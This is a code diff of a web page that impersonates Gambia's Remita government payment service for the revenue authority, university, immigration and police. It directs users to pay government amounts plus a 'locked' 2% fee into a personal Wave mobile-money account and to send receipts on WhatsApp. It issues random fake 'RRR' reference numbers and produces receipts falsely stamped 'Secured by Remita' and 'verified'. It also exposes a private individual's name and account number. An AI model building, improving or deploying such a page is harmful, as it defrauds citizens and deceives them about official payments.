@@ -1,9 +1,74 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Gambia Remita</title>
-<style>body{margin:0;font-family:sans-serif;background:#f8fafc}header{background:#fff;padding:12px 16px;display:flex;gap:10px;border-bottom:1px solid #e2e8f0}.logo{width:36px;height:36px;background:#16a34a;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800}main{max-width:480px;margin:0 auto;padding:16px}input,select{width:100%;padding:14px;border-radius:12px;border:1px solid #cbd5e1;margin:8px 0}button{width:100%;padding:14px;border:none;border-radius:12px;font-weight:800;background:#16a34a;color:#fff} .card{background:#fff;border-radius:16px;padding:14px;border:1px solid #e2e8f0;margin-top:12px}</style></head><body>
-<header><div class="logo">R</div><div><b>Gambia Remita</b><br><small style="color:#64748b">Gov Payments - 2% Fee</small></div></header>
-<main><h2>Generate RRR Number</h2><input id="name" placeholder="Full Name"><input id="phone" placeholder="Phone"><select id="inst"><option>University of The Gambia (UTG)</option><option>Gambia Revenue Authority (GRA)</option><option>Immigration Department</option><option>Ministry of Education</option><option>Gambia Ports Authority</option></select><input id="amount" type="number" placeholder="Gov Amount e.g. 5000"><div style="background:#dcfce7;padding:10px;border-radius:10px;font-size:13px">Fee 2%: <b id="f">0 GMD</b> | Total: <b id="t">0 GMD</b></div><button onclick="gen()">Generate RRR & Order ID</button><div id="res" class="card" style="display:none"></div></main>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GAMBIA Remita GRR - Premium V5</title>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<style>
+*{box-sizing:border-box;font-family:system-ui}body{margin:0;background:#f8fafc;padding-bottom:80px}header{background:#000;color:#fff;padding:14px 16px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:20}.logo{width:44px;height:44px;background:linear-gradient(135deg,#facc15,#16a34a);border-radius:12px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:22px;box-shadow:0 0 0 2px #22c55e}.hdr b{font-size:19px;line-height:1}.stickyWave{position:sticky;top:58px;z-index:19;background:#0a46d3;color:#fff;padding:10px 16px;display:flex;align-items:center;gap:10px;box-shadow:0 4px 12px rgba(10,70,211,0.4)}.stickyWave b{font-size:14px}.card{background:#fff;border-radius:20px;padding:18px;margin:12px;border:1px solid #e2e8f0;max-width:500px;margin-left:auto;margin-right:auto;box-shadow:0 2px 12px rgba(0,0,0,0.05)}label{font-size:12px;font-weight:800;color:#334155;margin-top:14px;display:block;text-transform:uppercase;letter-spacing:0.5px}input,select{width:100%;padding:15px;border-radius:14px;border:2px solid #0f172a;margin:6px 0;font-size:15px;font-weight:600}.yellowBox{background:linear-gradient(135deg,#fef08a,#facc15);border-radius:16px;padding:16px;margin-top:12px;border:2px solid #eab308;animation:slide 0.3s}.progress{display:flex;gap:6px;margin:12px 0}.prog{height:6px;flex:1;background:#e2e8f0;border-radius:10px}.prog.active{background:#16a34a}.orderBig{background:#fffbeb;border:2.5px dashed #f59e0b;border-radius:16px;padding:14px;text-align:center;font-size:22px;font-weight:900}.rrrBig{background:#f0fdf4;border:2.5px dashed #16a34a;border-radius:16px;padding:14px;text-align:center;font-size:22px;font-weight:900;color:#166534}.btnRow{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:14px}.btn{padding:13px;border-radius:12px;font-weight:800;border:2px solid;cursor:pointer;font-size:13px}.badge{font-size:10px;background:#dcfce7;color:#166534;padding:4px 10px;border-radius:20px;font-weight:800}@keyframes slide{from{transform:translateY(-10px);opacity:0}to{transform:translateY(0);opacity:1}}
+</style></head><body>
+<header><div class="logo">GR</div><div><b>GAMBIA Remita GRR</b><br><small style="color:#94a3b8;font-size:11px">Gov Revenue Receipt • Premium V5 • 2% Fee Locked</small></div><div style="margin-left:auto">🔒</div></header>
+<div class="stickyWave"><div style="font-size:22px">🌊</div><div><div style="font-size:10px;opacity:0.8">WAVE ACCOUNT - VERIFIED & ACTIVE - PAY HERE</div><b>872713918 • Mariam Tunkara</b></div><div style="margin-left:auto;background:#fff;color:#0a46d3;padding:4px 10px;border-radius:20px;font-size:10px;font-weight:900">VISIBLE</div></div>
+
+<div class="card">
+<div class="progress"><div class="prog active"></div><div class="prog"></div><div class="prog"></div></div>
+<div style="display:flex;justify-content:space-between"><b>Step 1: Customer Details</b><span class="badge">2% LOCKED</span></div>
+<label>Institution</label><select id="inst"><option>Gambia Revenue Authority - GRA</option><option>UTG University</option><option>MOBSE</option><option>GPF - Police</option><option>Immigration</option><option>GPA - Ports</option></select>
+<label>Full Name</label><input id="name" placeholder="Mariam Tunkara">
+<label>Phone WhatsApp</label><input id="phone" placeholder="+220 872713918">
+<label>Government Amount (GMD)</label><input id="amount" type="number" placeholder="e.g. 5000" oninput="calc()">
+
+<div id="feeBox" class="yellowBox" style="display:none">
+<div style="display:flex;align-items:center;gap:8px;font-weight:900">🧮 Auto Fee - Locked & Calculated</div>
+<div style="background:#fff;border-radius:10px;padding:10px;margin-top:8px">
+<div style="display:flex;justify-content:space-between"><span>Gov Amount:</span><b><span id="g">0</span> GMD</b></div>
+<div style="display:flex;justify-content:space-between"><span>Fee 2% LOCKED:</span><b style="color:#dc2626"><span id="f">0</span> GMD</b></div>
+<div style="border-top:1px dashed #cbd5e1;margin:8px 0"></div>
+<div style="display:flex;justify-content:space-between;font-size:18px"><span>TOTAL PAY:</span><b style="color:#166534"><span id="t">0</span> GMD</b></div>
+</div>
+<small>✅ Cannot avoid fee - Auto added</small>
+</div>
+
+<button onclick="makeOrder()" style="width:100%;background:#0a46d3;color:#fff;padding:16px;border:none;border-radius:14px;font-weight:900;margin-top:14px;font-size:16px">Generate Order ID →</button>
+<div id="orderArea" style="display:none;margin-top:14px"></div>
+</div>
+
+<div class="card">
+<div class="progress"><div class="prog"></div><div class="prog active"></div><div class="prog"></div></div>
+<b>Step 2: Check & Get RRR (After Approval)</b><br><small style="color:#64748b">RRR released ONLY after admin approves payment. Order ID can't give RRR until approved.</small>
+<input id="checkId" placeholder="ORD-XXXXXXX" style="margin-top:12px">
+<button onclick="check()" style="width:100%;background:#000;color:#fff;padding:15px;border:none;border-radius:14px;font-weight:900;margin-top:8px">🔍 Check Status & Get RRR</button>
+<div id="checkArea" style="display:none;margin-top:14px"></div>
+</div>
+
 <script>
 let orders=JSON.parse(localStorage.getItem('remitaOrders')||'[]');
-document.getElementById('amount').addEventListener('input',e=>{let a=Number(e.target.value)||0;let fee=a*0.02;document.getElementById('f').innerText=fee.toFixed(2)+' GMD';document.getElementById('t').innerText=(a+fee).toFixed(2)+' GMD';});
-function gen(){let name=document.getElementById('name').value.trim(),phone=document.getElementById('phone').value.trim(),inst=document.getElementById('inst').value,amount=Number(document.getElementById('amount').value);if(!name||!phone||!amount){alert('Fill all');return}let fee=amount*0.02;let id='ORD-'+Math.floor(1000000+Math.random()*9000000);let rrr=Math.floor(100000000000+Math.random()*900000000000);let o={name,phone,inst,amount,fee,id,rrr,status:'PENDING',date:new Date().toLocaleDateString()};orders.push(o);localStorage.setItem('remitaOrders',JSON.stringify(orders));let r=document.getElementById('res');r.style.display='block';r.innerHTML=`<b style="color:#16a34a">✓ Generated!</b><br><br>Order ID: <b>${id}</b><br>RRR: <b style="font-size:18px;color:#16a34a">${rrr}</b><br><br>Gov: GMD ${amount}<br>Fee: GMD ${fee.toFixed(2)}<br>Total: GMD ${(amount+fee).toFixed(2)}<br><br><button onclick="navigator.clipboard.writeText('${rrr}');alert('Copied')" style="background:#dcfce7;color:#16a34a">Copy RRR</button>`;}
-</script></body></html>
+function calc(){
+ let a=Number(document.getElementById('amount').value)||0;
+ let box=document.getElementById('feeBox');
+ if(a>0){box.style.display='block';document.getElementById('g').innerText=a.toLocaleString();document.getElementById('f').innerText=(a*0.02).toLocaleString();document.getElementById('t').innerText=(a*1.02).toLocaleString();}else{box.style.display='none';}
+}
+function makeOrder(){
+ let name=document.getElementById('name').value.trim()||'Customer'; let phone=document.getElementById('phone').value.trim()||'872713918'; let inst=document.getElementById('inst').value; let amount=Number(document.getElementById('amount').value);
+ if(!amount){alert('Enter Gov Amount - Fee auto calculates!');return}
+ let fee=amount*0.02; let tot=amount+fee;
+ let id='ORD-'+Math.floor(1000000+Math.random()*9000000);
+ let rrr='GRR-'+Math.floor(100000000000+Math.random()*900000000000);
+ let o={name,phone,inst,amount,fee,total:tot,id,rrr,status:'PENDING_PAYMENT',date:new Date().toLocaleString()};
+ orders.push(o); localStorage.setItem('remitaOrders',JSON.stringify(orders));
+ let area=document.getElementById('orderArea'); area.style.display='block';
+ area.innerHTML=`<div class="orderBig">${id}</div><div style="background:#fef2f2;border:2px solid #fecaca;border-radius:14px;padding:12px;margin-top:10px;text-align:center"><b style="color:#dc2626">⛔ NO RRR YET - PAY FIRST!</b><br><small>Pay Total <b>${tot.toFixed(2)} GMD</b> to<br><b style="font-size:16px">Wave 872713918 Mariam Tunkara</b><br>Fee ${fee.toFixed(2)} GMD LOCKED cannot avoid<br><br>Send receipt + ${id} on WhatsApp<br>After approval, enter ID below to get RRR</small></div><button style="width:100%;margin-top:10px;padding:12px;border-radius:12px;border:1px solid #cbd5e1;font-weight:700" onclick="navigator.clipboard.writeText('${id}');alert('Order ID Copied')">📋 Copy Order ID</button>`;
+ document.getElementById('checkId').value=id;
+}
+function check(){
+ let id=document.getElementById('checkId').value.trim(); let list=JSON.parse(localStorage.getItem('remitaOrders')||'[]'); let o=list.find(x=>x.id===id);
+ let area=document.getElementById('checkArea'); area.style.display='block';
+ if(!o){area.innerHTML=`<div style="background:#fef2f2;padding:12px;border-radius:12px;color:#dc2626;font-weight:700">❌ Order ID not found</div>`;return}
+ if(o.status!=='APPROVED'){
+  area.innerHTML=`<div style="background:#fffbeb;border:2px solid #fde68a;border-radius:14px;padding:14px"><div style="font-weight:900">⏳ PENDING - Payment Not Approved</div><br>Order: <b>${o.id}</b><br>Name: ${o.name}<br>Gov: ${Number(o.amount).toFixed(2)} + Fee LOCKED ${Number(o.fee).toFixed(2)} = Total ${Number(o.total).toFixed(2)} GMD<br><br><span style="background:#fef3c7;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800">STATUS: ${o.status} - Cannot get RRR yet</span><br><br><small>Wave: 872713918 Mariam Tunkara - Send receipt to admin</small></div>`;return
+ }
+ area.innerHTML=`<div style="border:3px solid #16a34a;border-radius:20px;padding:16px;background:#f0fdf4"><div style="text-align:center"><span style="background:#16a34a;color:#fff;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:900">✅ APPROVED - RRR RELEASED</span></div><div style="text-align:center;margin:10px 0"><small>GAMBIA Remita GRR</small><br><b>${o.name}</b><br>${o.inst} • ${o.phone}<br><small>${o.date}</small></div><div class="orderBig" style="font-size:16px">${o.id}</div><div class="rrrBig" style="margin-top:10px">${o.rrr}</div><div id="qrcode" style="display:flex;justify-content:center;margin:12px 0"></div><div style="background:#fff;border-radius:12px;padding:10px;font-size:13px">Gov: ${Number(o.amount).toFixed(2)} GMD<br>Fee 2% LOCKED → Wave 872713918 Mariam Tunkara: ${Number(o.fee).toFixed(2)} GMD<br>Total: ${Number(o.total).toFixed(2)} GMD</div><div class="btnRow"><button class="btn" style="border-color:#16a34a;color:#16a34a;background:#fff" onclick="navigator.clipboard.writeText('${o.rrr}');alert('RRR Copied')">📋 Copy</button><button class="btn" style="background:#fff" onclick="let msg='GAMBIA Remita GRR\\nOrder: ${o.id}\\nRRR: ${o.rrr}\\nWave: 872713918 Mariam Tunkara\\nFee LOCKED 2%'; if(navigator.share){navigator.share({text:msg})}else{navigator.clipboard.writeText(msg);alert('Copied for share')}">↗️ Share</button><button class="btn" style="background:#166534;color:#fff" onclick="savePDF('${o.id}','${o.rrr}','${o.name}','${o.inst}','${o.phone}','${o.amount}','${o.fee}','${o.total}')">💾 Save</button></div></div>`;
+ setTimeout(()=>{new QRCode(document.getElementById('qrcode'),{text:o.rrr,width:120,height:120});},200);
+}
+function savePDF(id,rrr,name,inst,phone,amount,fee,total){
+ let txt=`GAMBIA Remita GRR - PREMIUM V5 RECEIPT\n\nOrder ID: ${id}\nGRR Reference: ${rrr}\nName: ${name}\nInstitution: ${inst}\nPhone: ${phone}\n\nGovernment Amount: ${Number(amount).toFixed(2)} GMD\nFee 2% LOCKED (Auto-calculated, Cannot Avoid): ${Number(fee).toFixed(2)} GMD -> Wave 872713918 Mariam Tunkara\nTotal Paid: ${Number(total).toFixed(2)} GMD\n\nStatus: APPROVED & SAFE & VERIFIED\nDate: ${new Date().toLocaleString()}\n\nQR Code: ${rrr}\n\nSecured by Remita - SSL Encrypted - Transaction Monitored 24/7\nFee cannot be avoided in any way - Auto calculated\n`;
+ let blob=new Blob([txt],{type:'text/plain'}); let a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`GRR-PREMIUM-${id}.txt`; a.click();
+}
+</script>
+</body></html>
